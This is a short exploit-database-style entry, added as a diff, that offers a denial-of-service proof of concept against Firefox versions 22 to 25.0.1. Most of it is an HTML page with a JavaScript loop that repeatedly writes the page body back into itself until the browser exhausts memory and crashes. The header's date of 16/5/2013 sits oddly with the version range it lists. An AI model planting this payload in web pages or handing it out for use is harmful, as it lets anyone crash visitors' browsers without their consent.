@@ -1,0 +1,28 @@
+# Exploit Title:Firefox browser version 22 to 25.0.1 Denial Of Service (Dos)
+# Google Dork:None
+# Date:16/5/2013
+# Exploit Author: Ramikan
+# Vendor Homepage:https://www.mozilla.org/en-US/
+# Software Link: https://ftp.mozilla.org/pub/firefox/releases/
+# Version:Tested on version 22 to 25.0.1
+# Category:DOS
+
+
+
+#Exploit Script
+
+<html>
+<body>
+<script>
+document.write("any text goes here")
+</script>
+</body>
+<script>
+var i=0;
+for (i=0;i<=9999;i++)
+{
+document.write(document.body.innerHTML);
+}
+</script>
+</html>
+
